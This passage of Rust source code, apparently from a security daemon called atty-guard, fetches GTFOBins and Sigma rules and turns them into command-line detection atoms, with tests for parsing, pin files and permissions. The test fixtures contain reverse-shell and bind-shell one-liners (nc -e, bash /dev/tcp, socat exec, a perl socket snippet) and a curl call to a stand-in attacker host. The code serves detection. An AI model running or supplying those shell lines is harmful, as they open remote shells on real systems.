    fn extract_sigma_atoms(content: &str, atoms: &mut BTreeSet<String>) {
        let parsed: serde_yaml::Value = match serde_yaml::from_str(content) {
            Ok(v) => v,
            Err(_) => return,
        };
        let Some(detection) = parsed.get("detection").and_then(|d| d.as_mapping()) else {
            return;
        };
        for (sel_key, sel_val) in detection {
            // Skip the `condition` field; everything else is a
            // selector block (mapping of `key|modifier -> value`).
            if sel_key.as_str() == Some("condition") {
                continue;
            }
            let Some(sel_map) = sel_val.as_mapping() else {
                continue;
            };
            for (k, v) in sel_map {
                let Some(ks) = k.as_str() else { continue };
                if !ks.contains("|contains") {
                    continue;
                }
                // Value is either a single string or a list of
                // strings. Both flow through `atom_from_code`'s
                // first-non-blank-line + length rules.
                if let Some(s) = v.as_str() {
                    if let Some(atom) = atom_from_code(s) {
                        atoms.insert(atom);
                    }
                } else if let Some(seq) = v.as_sequence() {
                    for v in seq {
                        if let Some(s) = v.as_str() {
                            if let Some(atom) = atom_from_code(s) {
                                atoms.insert(atom);
                            }
                        }
                    }
                }
            }
        }
    }

    /// Max atom length the GTFOBins fetcher will emit. Longer
    /// fragments are higher-signal (full perl/python reverse-shell
    /// one-liners run 100-250 chars) — keeping them is the whole
    /// point of including GTFOBins. The original 60-char ceiling
    /// was too restrictive and dropped the most diagnostic atoms.
    /// The AC scan cost is O(haystack) and effectively independent
    /// of pattern length, so longer atoms don't slow matching.
    const ATOM_MAX_LEN: usize = 200;
    const ATOM_MIN_LEN: usize = 3;

    /// Turn a GTFOBins / Sigma `code` scalar into a single atom string.
    /// We take the first non-blank line, strip leading whitespace
    /// (markdown YAML scalars carry indentation), refuse atoms below
    /// the min or above the max length (too short = noise; too long
    /// = better suited to a regex anyway), and refuse placeholder-
    /// shaped atoms (see `is_placeholder_atom`).
    fn atom_from_code(code: &str) -> Option<String> {
        for line in code.lines() {
            let t = line.trim();
            if t.is_empty() {
                continue;
            }
            // Drop trailing `# example` comments — they're docs,
            // not atom content. Trim AFTER comment strip because
            // the strip can leave trailing spaces.
            let clean_str = match t.find(" #") {
                Some(i) => &t[..i],
                None => t,
            };
            let clean = clean_str.trim();
            if clean.len() < ATOM_MIN_LEN || clean.len() > ATOM_MAX_LEN {
                return None;
            }
            if is_placeholder_atom(clean) {
                return None;
            }
            return Some(clean.to_owned());
        }
        None
    }

    /// Sigma rule authors write `CommandLine|contains` values with
    /// rule-format placeholders like `/path/to/output-file` (any
    /// path), `{PATH:.exe}` (any .exe path), `{PATH_ABSOLUTE:.dll}`
    /// (any .dll absolute path), or angle-bracket templates like
    /// `<hostname>` / `<username>`. SIEM consumers translate these
    /// to wildcards at detection time. Aho-Corasick treats them as
    /// literals, so they match exactly the placeholder string and
    /// nothing else — dead weight in the automaton.
    ///
    /// Chain semantics are preserved: a typical Sigma rule lists
    /// MULTIPLE substrings (e.g. `["curl ", " -o /tmp/",
    /// "/path/to/output-file"]`), each extracted as its own atom.
    /// Dropping the placeholder atom doesn't reduce the rule's
    /// detection capability because the placeholder never fired
    /// anyway — the other two literal atoms carry the signal via
    /// V2-J multi-hit accumulation.
    fn is_placeholder_atom(atom: &str) -> bool {
        // Delegate to the always-available top-level fn so the
        // predicate is shared between the atom-fetcher's extract
        // path and the trust_store's `atoms add` validator —
        // operators can't sneak placeholder-shaped atoms into the
        // user overlay any more than the fetcher would accept them.
        super::is_placeholder_atom_public(atom)
    }

    /// Atomic write: tmp file in the same dir + rename. Reader
    /// (the AtomMatcher loader) never sees a half-written file.
    fn write_atoms(path: &Path, atoms: &BTreeSet<String>) -> Result<(), FetchError> {
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)
                .map_err(|e| FetchError::WriteError(format!("mkdir -p {parent:?}: {e}")))?;
        }
        let tmp = path.with_extension("txt.tmp");
        let header = "# atty-guard auto-fetched atom set (atoms.system.txt).\n# Generated by `atty-guard --update-atoms-now` (or the daemon's\n# `--atoms-update-interval` cron mode). Do NOT hand-edit —\n# changes get overwritten on next refresh. The bundled\n# `flagged_atoms.txt` (in the atty repo, compile-time embedded)\n# stays the always-on baseline; this file is the daemon's\n# runtime overlay loaded with a permission gate (must be atty-\n# owned, no group/world-write). Lives at $STATE_DIRECTORY/, i.e.\n# /var/lib/atty-guard/atoms.system.txt on the system daemon.\n";
        let mut content = String::with_capacity(header.len() + atoms.len() * 32);
        content.push_str(header);
        for a in atoms {
            content.push_str(a);
            content.push('\n');
        }
        std::fs::write(&tmp, content)
            .map_err(|e| FetchError::WriteError(format!("write {tmp:?}: {e}")))?;
        std::fs::rename(&tmp, path)
            .map_err(|e| FetchError::WriteError(format!("rename → {path:?}: {e}")))?;
        Ok(())
    }

    /// Spawn the cron-style background refresh. Fetches FIRST
    /// (so a daemon launched with `--atoms-update-interval` always
    /// gets a fresh corpus on startup, not after one interval), then
    /// sleeps. Failures don't abort the thread — the next interval
    /// gets another shot.
    pub fn spawn_periodic_refresh(
        cfg: FetcherConfig,
        sources: Vec<SourceId>,
        interval: Duration,
        trust_store: std::sync::Arc<crate::trust_store::TrustStore>,
    ) {
        let builder = std::thread::Builder::new().name("atty-guard-atoms-refresh".into());
        // `cfg` is mutable inside the loop so successful pin
        // reloads stick across ticks. Earlier shape used
        // `cfg.clone()` per iteration, which always cloned the
        // STARTUP cfg — meaning a mid-life pin bump that loaded
        // successfully at tick N would be silently reverted by
        // ANY error at tick N+1 (parse fail, transient FS
        // hiccup, etc.). The mutable form preserves the last
        // successful state across the error arm.
        //
        // Tracks pin-state transitions for journald breadcrumbs
        // when the operator removes/re-creates the file.
        let spawn_result = builder.spawn(move || {
            let mut cfg = cfg;
            let mut had_pins = cfg.pins.is_some();
            loop {
                // Re-read /etc/atty-guard/atoms.pins.toml every tick so
                // an operator bumping pins doesn't need to restart the
                // daemon to get a fresh fetch under the new pin. A
                // newly-broken pin file (operator mid-edit) keeps the
                // last-good cfg.pins — the cron is fail-safe rather
                // than fail-closed for this auxiliary path. An ENOENT
                // (operator removed the file) is treated as a state
                // transition to live tracking, but we log it so the
                // operator sees the downgrade in journald.
                match load_pins(Path::new(DEFAULT_PIN_FILE)) {
                    Ok(pins) => {
                        let now_pinned = pins.is_some();
                        if had_pins && !now_pinned {
                            eprintln!(
                                "atty-guard: pin file removed — switching to live tracking (refs/heads/master). Restore /etc/atty-guard/atoms.pins.toml if this was unintentional."
                            );
                        } else if !had_pins && now_pinned {
                            eprintln!(
                                "atty-guard: pin file detected — switching to pinned-commit tracking."
                            );
                        }
                        had_pins = now_pinned;
                        cfg.pins = pins;
                    }
                    Err(e) => {
                        // Keep the last-known cfg.pins unchanged —
                        // mid-edit truncation shouldn't revert a
                        // previously-successful pin reload.
                        eprintln!(
                            "atty-guard: pin reload failed (keeping last-known) — {e}"
                        );
                    }
                }
                match fetch_all(&cfg, &sources) {
                    Ok(report) => {
                        eprintln!(
                            "atty-guard: atom refresh ok — {} atoms across {} sources",
                            report.atoms_total,
                            report.per_source.len()
                        );
                        // Reload the in-memory corpus from the file we
                        // just wrote so classify dispatch picks up the
                        // new entries without waiting for daemon restart.
                        // Failure here is non-fatal: the next refresh
                        // tick gets another shot, and the perm-gate error
                        // (if any) already went to journald.
                        match trust_store.reload_system_fetched() {
                            Ok(n) => eprintln!(
                                "atty-guard: atoms.system.txt reloaded ({n} atoms in memory)"
                            ),
                            Err(e) => {
                                eprintln!("atty-guard: atoms.system.txt reload failed — {e}");
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("atty-guard: atom refresh failed — {e}");
                    }
                }
                std::thread::sleep(interval);
            }
        });
        if let Err(e) = spawn_result {
            eprintln!(
                "atty-guard: cron thread spawn failed — {e}; atoms will not refresh until restart"
            );
        }
    }

    #[cfg(test)]
    mod imp_tests {
        use super::*;

        #[test]
        fn atom_from_code_picks_first_nonblank_line() {
            let code = "\n\nnc -e /bin/sh ATTACKER PORT\n";
            assert_eq!(
                atom_from_code(code).as_deref(),
                Some("nc -e /bin/sh ATTACKER PORT")
            );
        }

        #[test]
        fn atom_from_code_strips_trailing_doc_comment() {
            let code = "bash -i  # spawn an interactive shell";
            assert_eq!(atom_from_code(code).as_deref(), Some("bash -i"));
        }

        #[test]
        fn atom_from_code_rejects_too_long() {
            // Past the ATOM_MAX_LEN ceiling — anything bigger
            // belongs in a regex rule, not an atom.
            let s = "a".repeat(ATOM_MAX_LEN + 1);
            assert!(atom_from_code(&s).is_none());
        }

        #[test]
        fn atom_from_code_accepts_realistic_gtfobins_oneliner() {
            // Real GTFOBins entries run 100-250 chars — keeping
            // them is the whole point of including the corpus.
            // This length sat above the original 60-char ceiling.
            let perl_one_liner = "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));'";
            // Sanity: the example is between min and max.
            assert!(perl_one_liner.len() > 60);
            assert!(perl_one_liner.len() <= ATOM_MAX_LEN);
            assert_eq!(
                atom_from_code(perl_one_liner).as_deref(),
                Some(perl_one_liner)
            );
        }

        #[test]
        fn atom_from_code_rejects_too_short() {
            assert!(atom_from_code("hi").is_none());
        }

        #[test]
        fn atom_from_code_rejects_sigma_path_placeholder() {
            // Sigma rule authoring convention — `/path/to/...` is a
            // template literal that matches nothing in real input.
            assert!(atom_from_code("uniq /path/to/input-file").is_none());
            assert!(atom_from_code("emacs /path/to/output-file").is_none());
        }

        #[test]
        fn atom_from_code_rejects_path_template_placeholders() {
            // LOLBAS-style templates appear in Sigma rules derived
            // from LOLBAS metadata too.
            assert!(atom_from_code("script {PATH:.exe} arg").is_none());
            assert!(atom_from_code("loader {PATH_ABSOLUTE:.dll}").is_none());
        }

        #[test]
        fn atom_from_code_rejects_angle_bracket_placeholders() {
            assert!(atom_from_code("ssh <hostname>").is_none());
            assert!(atom_from_code("connect <user>@<host>").is_none());
            // Real angle-bracket usage (redirection, comparison) keeps
            // a non-identifier between the brackets — should pass.
            assert!(atom_from_code("bash -i >& /dev/tcp/x/4444").is_some());
            assert!(atom_from_code("cmd 2>&1 < input.txt").is_some());
        }

        #[test]
        fn extract_gtfobins_parses_canonical_yaml() {
            // Minimal example modelled after the real GTFOBins
            // front-matter shape.
            let doc = r#"---
description: "demo"
functions:
  shell:
    - code: |
        nc -e /bin/sh 10.0.0.1 4444
    - code: |
        bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
  reverse-shell:
    - code: |
        socat - tcp:10.0.0.1:4444 exec:bash
---
# rest of markdown
"#;
            let mut atoms = BTreeSet::new();
            extract_gtfobins_atoms(doc, &mut atoms);
            assert!(atoms.iter().any(|a| a.contains("nc -e")));
            assert!(atoms.iter().any(|a| a.contains("/dev/tcp")));
            assert!(atoms.iter().any(|a| a.starts_with("socat")));
        }

        #[test]
        fn extract_sigma_parses_command_line_contains() {
            let doc = r#"
title: Demo reverse shell detection
detection:
  selection_nc:
    CommandLine|contains:
      - 'nc -e /bin/sh'
      - '/dev/tcp/'
  selection_curl:
    CommandLine|contains: 'curl -fsSL http://attacker'
  filter:
    Image|endswith: '/usr/bin/git'
  condition: selection_nc or selection_curl
"#;
            let mut atoms = BTreeSet::new();
            extract_sigma_atoms(doc, &mut atoms);
            assert!(atoms.iter().any(|a| a.contains("nc -e")));
            assert!(atoms.iter().any(|a| a.contains("/dev/tcp")));
            assert!(atoms.iter().any(|a| a.contains("curl -fsSL")));
            // |endswith selector is NOT a |contains atom — filtered.
            assert!(!atoms.iter().any(|a| a.contains("/usr/bin/git")));
        }

        #[test]
        fn extract_sigma_handles_no_detection_block() {
            // Defensive: rules without a `detection` mapping (e.g.
            // metadata-only files) yield zero atoms cleanly.
            let doc = "title: nothing here\nauthor: anon\n";
            let mut atoms = BTreeSet::new();
            extract_sigma_atoms(doc, &mut atoms);
            assert!(atoms.is_empty());
        }

        #[test]
        fn is_sigma_linux_rule_matches_only_linux_subtree() {
            use std::path::Path;
            let f = tar::EntryType::Regular;
            let d = tar::EntryType::Directory;
            assert!(is_sigma_linux_rule(
                Path::new("sigma-master/rules/linux/lateral_movement/foo.yml"),
                f
            ));
            assert!(!is_sigma_linux_rule(
                Path::new("sigma-master/rules/linux/x"),
                d
            )); // not a file
            assert!(!is_sigma_linux_rule(
                Path::new("sigma-master/rules/windows/persist.yml"),
                f
            )); // wrong OS
            assert!(!is_sigma_linux_rule(
                Path::new("sigma-master/rules/linux/readme.md"),
                f
            )); // wrong ext
        }

        #[test]
        fn extractors_handle_malformed_yaml_cleanly() {
            // Sigma parser must NOT panic on malformed YAML — returns
            // zero atoms via the early Err arm in `serde_yaml::from_str`.
            let mut atoms = BTreeSet::new();
            extract_sigma_atoms("not: [valid: yaml", &mut atoms);
            assert!(atoms.is_empty());
            // Also: empty input.
            extract_sigma_atoms("", &mut atoms);
            assert!(atoms.is_empty());
        }

        #[test]
        fn extract_gtfobins_handles_missing_close_fence() {
            // Upstream GTFOBins files have ONLY a leading `---\n`
            // fence — no closing one. The whole file is YAML. The
            // earlier "require closing fence" check produced 0
            // atoms across the entire corpus (the bug this commit
            // also fixes). Now: leading fence stripped, rest parsed
            // as YAML, atoms emitted.
            let doc = "---\nfunctions:\n  shell:\n  - code: |-\n      nc -e /bin/sh 1.2.3.4\n  bind-shell:\n  - code: nc -l -p 12345 -e /bin/sh\n";
            let mut atoms = BTreeSet::new();
            extract_gtfobins_atoms(doc, &mut atoms);
            assert!(
                !atoms.is_empty(),
                "expected atoms from a no-close-fence file, got none"
            );
            assert!(
                atoms.iter().any(|a| a.contains("nc")),
                "expected an nc-related atom, got {atoms:?}"
            );
        }

        #[test]
        fn extract_gtfobins_handles_close_fence_when_present() {
            // Future-proof: if a GTFOBins file ever grows trailing
            // prose after a closing `---` fence, truncate at the
            // fence rather than handing the prose to serde_yaml.
            let doc = "---\nfunctions:\n  shell:\n  - code: |-\n      nc -e /bin/sh 1.2.3.4\n---\nPost-fence prose that isn't YAML.\n";
            let mut atoms = BTreeSet::new();
            extract_gtfobins_atoms(doc, &mut atoms);
            assert!(
                !atoms.is_empty(),
                "expected atoms when prose follows close fence"
            );
        }

        #[test]
        fn fetch_all_refuses_to_overwrite_when_all_sources_fail() {
            // No sources requested → no atoms collected →
            // fetch_all returns an error and DOES NOT call
            // write_atoms. Belt-and-braces against silently
            // wiping the last-good corpus.
            let dir = std::env::temp_dir()
                .join(format!("atty-guard-fetcher-empty-{}", std::process::id()));
            let path = dir.join("atoms.system.txt");
            let cfg = FetcherConfig {
                output_path: path.clone(),
                ..FetcherConfig::default()
            };
            let result = fetch_all(&cfg, &[]);
            assert!(matches!(result, Err(FetchError::ParseError(_))));
            assert!(
                !path.exists(),
                "fetch_all must not create the output file on empty success set"
            );
        }

        #[test]
        fn write_atoms_roundtrips_via_tmp_rename() {
            let dir =
                std::env::temp_dir().join(format!("atty-guard-fetcher-{}", std::process::id()));
            let path = dir.join("atoms.system.txt");
            let mut s = BTreeSet::new();
            s.insert("nc -e /bin/sh".to_owned());
            s.insert("/dev/tcp/".to_owned());
            write_atoms(&path, &s).unwrap();
            let read = std::fs::read_to_string(&path).unwrap();
            assert!(read.contains("nc -e"));
            assert!(read.contains("/dev/tcp/"));
            std::fs::remove_dir_all(&dir).ok();
        }

        #[test]
        fn verify_digest_accepts_matching_sha() {
            let bytes = b"the quick brown fox";
            let actual_hex = hex_encode(&Sha256::digest(bytes));
            assert!(verify_digest("https://example/x", bytes, &actual_hex).is_ok());
        }

        #[test]
        fn verify_digest_rejects_mismatch() {
            let bytes = b"the quick brown fox";
            // Same digest but flipped last char — fails the eq check
            // even though it's still 64 hex chars long.
            let actual_hex = hex_encode(&Sha256::digest(bytes));
            let mut bad = actual_hex.clone();
            bad.replace_range(63..64, if &actual_hex[63..64] == "0" { "1" } else { "0" });
            match verify_digest("https://example/x", bytes, &bad) {
                Err(FetchError::DigestMismatch {
                    expected, actual, ..
                }) => {
                    assert_eq!(expected, bad);
                    assert_eq!(actual, actual_hex);
                }
                other => panic!("expected DigestMismatch, got {other:?}"),
            }
        }

        #[test]
        fn verify_digest_is_case_insensitive() {
            let bytes = b"abc";
            let actual_hex = hex_encode(&Sha256::digest(bytes));
            assert!(verify_digest("u", bytes, &actual_hex.to_uppercase()).is_ok());
        }

        #[test]
        fn pin_file_absent_returns_none() {
            let path =
                std::env::temp_dir().join(format!("atty-guard-pin-absent-{}", std::process::id()));
            assert!(!path.exists());
            let pins = load_pins(&path).expect("absent file is not an error");
            assert!(pins.is_none());
        }

        #[test]
        fn pin_file_round_trips() {
            let dir = std::env::temp_dir()
                .join(format!("atty-guard-pin-roundtrip-{}", std::process::id()));
            std::fs::create_dir_all(&dir).unwrap();
            let path = dir.join("atoms.pins.toml");
            let body = r#"
[gtfobins]
commit = "7382261ef936e35896ba70e7a6b833352ffb9a22"
sha256 = "3121cb8f46b90ba663dbd9b7b4177cacba32589fc55221ac0874dccbfc3ffaca"
"#;
            std::fs::write(&path, body).unwrap();
            let pins = load_pins_with_owner(&path, current_uid())
                .unwrap()
                .expect("file present → Some");
            let g = pins.gtfobins.expect("gtfobins entry");
            assert_eq!(g.commit, "7382261ef936e35896ba70e7a6b833352ffb9a22");
            assert!(pins.sigma.is_none(), "missing entry = partial pin");
            assert_eq!(
                g.tarball_url("GTFOBins/GTFOBins.github.io"),
                "https://codeload.github.com/GTFOBins/GTFOBins.github.io/tar.gz/7382261ef936e35896ba70e7a6b833352ffb9a22"
            );
            std::fs::remove_dir_all(&dir).ok();
        }

        #[test]
        fn pin_file_rejects_short_commit_hash() {
            // Bad commit, valid sha256 — proves the commit-length
            // check fires independently. Operators who paste an
            // abbreviated SHA need to learn this is a hard error.
            let dir = std::env::temp_dir()
                .join(format!("atty-guard-pin-shortsha-{}", std::process::id()));
            std::fs::create_dir_all(&dir).unwrap();
            let path = dir.join("atoms.pins.toml");
            std::fs::write(
                &path,
                "[gtfobins]\ncommit = \"7382261e\"\nsha256 = \"3121cb8f46b90ba663dbd9b7b4177cacba32589fc55221ac0874dccbfc3ffaca\"\n",
            )
            .unwrap();
            match load_pins_with_owner(&path, current_uid()) {
                Err(FetchError::ParseError(s)) => {
                    assert!(
                        s.contains("commit") && s.contains("40 hex"),
                        "msg should fault the commit specifically: {s}"
                    );
                }
                other => panic!("expected ParseError, got {other:?}"),
            }
            std::fs::remove_dir_all(&dir).ok();
        }

        #[test]
        fn pin_file_rejects_nonhex() {
            let dir =
                std::env::temp_dir().join(format!("atty-guard-pin-nonhex-{}", std::process::id()));
            std::fs::create_dir_all(&dir).unwrap();
            let path = dir.join("atoms.pins.toml");
            // 40 chars including a `z` — not hex.
            std::fs::write(
                &path,
                "[gtfobins]\ncommit = \"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\"\nsha256 = \"3121cb8f46b90ba663dbd9b7b4177cacba32589fc55221ac0874dccbfc3ffaca\"\n",
            )
            .unwrap();
            assert!(matches!(load_pins_with_owner(&path, current_uid()), Err(FetchError::ParseError(_))));
            std::fs::remove_dir_all(&dir).ok();
        }

        #[test]
        fn pin_file_rejects_short_sha256() {
            // Valid commit, bad sha256 — independent of the commit
            // check. Confirms BOTH validators fire, not just the
            // first one in evaluation order.
            let dir = std::env::temp_dir()
                .join(format!("atty-guard-pin-shortsha256-{}", std::process::id()));
            std::fs::create_dir_all(&dir).unwrap();
            let path = dir.join("atoms.pins.toml");
            std::fs::write(
                &path,
                "[gtfobins]\ncommit = \"7382261ef936e35896ba70e7a6b833352ffb9a22\"\nsha256 = \"3121cb8f\"\n",
            )
            .unwrap();
            match load_pins_with_owner(&path, current_uid()) {
                Err(FetchError::ParseError(s)) => {
                    assert!(
                        s.contains("sha256") && s.contains("64 hex"),
                        "msg should fault the sha256 specifically: {s}"
                    );
                }
                other => panic!("expected ParseError, got {other:?}"),
            }
            std::fs::remove_dir_all(&dir).ok();
        }

        #[test]
        fn pin_file_rejects_malformed_toml() {
            let dir = std::env::temp_dir()
                .join(format!("atty-guard-pin-malformed-{}", std::process::id()));
            std::fs::create_dir_all(&dir).unwrap();
            let path = dir.join("atoms.pins.toml");
            std::fs::write(&path, "this is = not [ toml\n").unwrap();
            assert!(matches!(load_pins_with_owner(&path, current_uid()), Err(FetchError::ParseError(_))));
            std::fs::remove_dir_all(&dir).ok();
        }

        #[test]
        fn pin_entry_tarball_url_uses_commit() {
            let p = PinEntry {
                commit: "abcd1234".repeat(5),
                sha256: "0".repeat(64),
            };
            let url = p.tarball_url("owner/repo");
            assert!(url.ends_with(&p.commit));
            assert!(url.contains("codeload.github.com"));
            assert!(url.contains("owner/repo"));
            assert!(!url.contains("refs/heads/master"));
        }

        #[test]
        fn atom_count_cap_accepts_at_limit() {
            // At-cap (== MAX_ATOMS_TOTAL) is fine — the check is strictly `>`.
            // Operators with a legitimately large corpus shouldn't trip
            // exactly-at-cap.
            assert!(enforce_atom_count_cap(MAX_ATOMS_TOTAL).is_ok());
        }

        #[test]
        fn atom_count_cap_rejects_over_limit() {
            // Over-cap returns a ParseError that mentions both the
            // count and the cap. This is the behaviour fetch_all relies
            // on to skip the write_atoms call and keep last-good.
            match enforce_atom_count_cap(MAX_ATOMS_TOTAL + 1) {
                Err(FetchError::ParseError(msg)) => {
                    assert!(msg.contains(&MAX_ATOMS_TOTAL.to_string()));
                    assert!(msg.contains("refusing to overwrite"));
                }
                other => panic!("expected ParseError, got {other:?}"),
            }
        }

        #[test]
        fn tarball_size_cap_accepts_at_limit() {
            assert!(enforce_tarball_size_cap("u", MAX_TARBALL_BYTES).is_ok());
            assert!(enforce_tarball_size_cap("u", 0).is_ok());
        }

        #[test]
        fn tarball_size_cap_rejects_over_limit() {
            match enforce_tarball_size_cap("https://x/y", MAX_TARBALL_BYTES + 1) {
                Err(FetchError::NetworkError(msg)) => {
                    assert!(msg.contains("https://x/y"));
                    assert!(msg.contains("32 MiB"));
                }
                other => panic!("expected NetworkError, got {other:?}"),
            }
        }

        #[test]
        fn fetch_all_caps_constants_are_within_documented_bounds() {
            // Lightweight sanity: cap is above both upstream sizes
            // (Sigma ~15 MB, GTFOBins ~2 MB) with headroom but not
            // unbounded. Catches anyone bumping MAX_TARBALL_BYTES to
            // a runaway value like usize::MAX.
            assert!(MAX_TARBALL_BYTES >= 16 * 1024 * 1024);
            assert!(MAX_TARBALL_BYTES <= 128 * 1024 * 1024);
            assert_eq!(MAX_ATOMS_TOTAL, 10_000);
        }

        #[test]
        fn pin_file_rejects_unknown_section() {
            // Operator typo: `[gtfobin]` instead of `[gtfobins]`.
            // Without `deny_unknown_fields`, serde parses this as
            // `AtomPins{None,None}` and the source falls back to
            // live tracking silently — defeating the whole point
            // of opting in. The reject path is the security
            // guarantee, not a nicety.
            let dir = std::env::temp_dir().join(format!(
                "atty-guard-pin-unknownsec-{}",
                std::process::id()
            ));
            std::fs::create_dir_all(&dir).unwrap();
            let path = dir.join("atoms.pins.toml");
            let body = r#"
[gtfobin]
commit = "7382261ef936e35896ba70e7a6b833352ffb9a22"
sha256 = "3121cb8f46b90ba663dbd9b7b4177cacba32589fc55221ac0874dccbfc3ffaca"
"#;
            std::fs::write(&path, body).unwrap();
            assert!(matches!(
                load_pins_with_owner(&path, current_uid()),
                Err(FetchError::ParseError(_))
            ));
            std::fs::remove_dir_all(&dir).ok();
        }

        #[test]
        fn pin_file_rejects_unknown_key() {
            // Operator added an unrecognised key (`branch = ...`)
            // alongside valid commit + sha256. Without
            // `#[serde(deny_unknown_fields)]` this would parse
            // successfully (extra fields silently ignored) and the
            // operator's expectation (e.g. "I want master branch")
            // would be silently violated. We keep BOTH required
            // fields valid so the test fails for the right reason
            // — the `branch` key — not because `commit` was missing.
            let dir = std::env::temp_dir().join(format!(
                "atty-guard-pin-unknownkey-{}",
                std::process::id()
            ));
            std::fs::create_dir_all(&dir).unwrap();
            let path = dir.join("atoms.pins.toml");
            let body = r#"
[gtfobins]
commit = "7382261ef936e35896ba70e7a6b833352ffb9a22"
sha256 = "3121cb8f46b90ba663dbd9b7b4177cacba32589fc55221ac0874dccbfc3ffaca"
branch = "main"
"#;
            std::fs::write(&path, body).unwrap();
            match load_pins_with_owner(&path, current_uid()) {
                Err(FetchError::ParseError(msg)) => {
                    assert!(
                        msg.contains("branch") || msg.contains("unknown"),
                        "error should fault the unknown key, not the parse generically: {msg}"
                    );
                }
                other => panic!("expected ParseError, got {other:?}"),
            }
            std::fs::remove_dir_all(&dir).ok();
        }

        #[test]
        fn pin_file_rejects_empty() {
            // Zero-byte file means "operator opted in with nothing".
            // Without this check it parses to AtomPins{None,None}
            // and silently disables pinning. Hard error matches the
            // rest of the pin-file parse posture.
            let dir = std::env::temp_dir()
                .join(format!("atty-guard-pin-empty-{}", std::process::id()));
            std::fs::create_dir_all(&dir).unwrap();
            let path = dir.join("atoms.pins.toml");
            std::fs::write(&path, "").unwrap();
            match load_pins_with_owner(&path, current_uid()) {
                Err(FetchError::ParseError(msg)) => {
                    assert!(msg.contains("empty"));
                }
                other => panic!("expected ParseError, got {other:?}"),
            }
            std::fs::remove_dir_all(&dir).ok();
        }

        #[test]
        fn pin_file_rejects_whitespace_only() {
            // Comments-only file (newlines + `# ...`) — operator
            // pasted the example template but never uncommented a
            // section. Without this check, all-comment TOML parses
            // to AtomPins{None,None} which we treat as opt-out.
            let dir = std::env::temp_dir().join(format!(
                "atty-guard-pin-comments-{}",
                std::process::id()
            ));
            std::fs::create_dir_all(&dir).unwrap();
            let path = dir.join("atoms.pins.toml");
            std::fs::write(&path, "   \n  \n\t\n").unwrap();
            match load_pins_with_owner(&path, current_uid()) {
                Err(FetchError::ParseError(msg)) => {
                    assert!(msg.contains("empty"));
                }
                other => panic!("expected ParseError, got {other:?}"),
            }
            std::fs::remove_dir_all(&dir).ok();
        }

        #[test]
        fn pin_file_rejects_perms_wrong_owner() {
            // Pin file's contract is "root-owned only". Anything
            // else means a local attacker (or a fat-finger
            // `chown $user`) could swap pins to point at attacker-
            // controlled commits. Refuse to load.
            let dir = std::env::temp_dir().join(format!(
                "atty-guard-pin-badowner-{}",
                std::process::id()
            ));
            std::fs::create_dir_all(&dir).unwrap();
            let path = dir.join("atoms.pins.toml");
            // Valid content — only the owner check should fire.
            std::fs::write(
                &path,
                "[gtfobins]\ncommit = \"7382261ef936e35896ba70e7a6b833352ffb9a22\"\nsha256 = \"3121cb8f46b90ba663dbd9b7b4177cacba32589fc55221ac0874dccbfc3ffaca\"\n",
            )
            .unwrap();
            // Pass an expected_uid that the file ISN'T owned by.
            // current_uid()+1 is guaranteed not to match (and not
            // be zero, so the message format is still meaningful).
            let bad_uid = current_uid().wrapping_add(1);
            match load_pins_with_owner(&path, bad_uid) {
                Err(FetchError::ParseError(msg)) => {
                    assert!(
                        msg.contains("owner uid"),
                        "msg should mention owner: {msg}"
                    );
                }
                other => panic!("expected ParseError, got {other:?}"),
            }
            std::fs::remove_dir_all(&dir).ok();
        }

        #[test]
        fn pin_file_rejects_world_writable() {
            // 0666 means anyone on the box can edit pins. Trust
            // model says "admin-managed via sudo only" — refuse.
            use std::os::unix::fs::PermissionsExt;
            let dir = std::env::temp_dir().join(format!(
                "atty-guard-pin-worldwrite-{}",
                std::process::id()
            ));
            std::fs::create_dir_all(&dir).unwrap();
            let path = dir.join("atoms.pins.toml");
            std::fs::write(
                &path,
                "[gtfobins]\ncommit = \"7382261ef936e35896ba70e7a6b833352ffb9a22\"\nsha256 = \"3121cb8f46b90ba663dbd9b7b4177cacba32589fc55221ac0874dccbfc3ffaca\"\n",
            )
            .unwrap();
            let mut perms = std::fs::metadata(&path).unwrap().permissions();
            perms.set_mode(0o666);
            std::fs::set_permissions(&path, perms).unwrap();
            match load_pins_with_owner(&path, current_uid()) {
                Err(FetchError::ParseError(msg)) => {
                    assert!(msg.contains("group/world write"));
                }
                other => panic!("expected ParseError, got {other:?}"),
            }
            std::fs::remove_dir_all(&dir).ok();
        }

        /// Resolve the current EUID for tests — pin file perm
        /// checks compare against this so a test running as a
        /// regular user can still exercise the parse path. Prod
        /// callers (`load_pins`) always pass 0.
        fn current_uid() -> u32 {
            unsafe {
                extern "C" {
                    fn geteuid() -> u32;
                }
                geteuid()
            }
        }
    }
}

#[cfg(feature = "atoms-fetch")]
pub use imp::{fetch_all, spawn_periodic_refresh};

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn source_id_parse() {
        assert_eq!(SourceId::parse("gtfobins"), Some(SourceId::Gtfobins));
        assert_eq!(SourceId::parse("sigma"), Some(SourceId::Sigma));
        // `lolbas` was removed — see module docs for the rationale.
        assert_eq!(SourceId::parse("lolbas"), None);
        assert_eq!(SourceId::parse("unknown"), None);
        assert_eq!(SourceId::parse(""), None);
    }

    #[test]
    fn default_enabled_includes_both_linux_sources() {
        let defaults = SourceId::default_enabled();
        assert!(defaults.contains(&SourceId::Gtfobins));
        assert!(defaults.contains(&SourceId::Sigma));
        assert_eq!(defaults.len(), 2);
    }

    #[test]
    fn source_id_name_round_trip() {
        for sid in SourceId::default_enabled() {
            assert!(SourceId::parse(sid.name()).is_some());
        }
    }

    #[test]
    fn default_atoms_path_under_state_or_var_lib() {
        let p = default_atoms_path();
        // Post-#150: the fetcher writes to atoms.system.txt at the
        // state-root (so the daemon's TrustStore reads it).
        assert!(p.ends_with("atoms.system.txt"));
        assert!(p.to_string_lossy().contains("atty-guard"));
    }

    #[test]
    fn fetch_error_display_includes_hint() {
        let e = FetchError::FeatureNotBuilt;
        let s = format!("{e}");
        assert!(s.contains("atoms-fetch"));
    }

    #[cfg(not(feature = "atoms-fetch"))]
    #[test]
    fn fetch_without_feature_errors_cleanly() {
        match fetch_all(&FetcherConfig::default(), &[SourceId::Gtfobins]) {
            Err(FetchError::FeatureNotBuilt) => {}
            Ok(_) => panic!("expected FeatureNotBuilt on default build"),
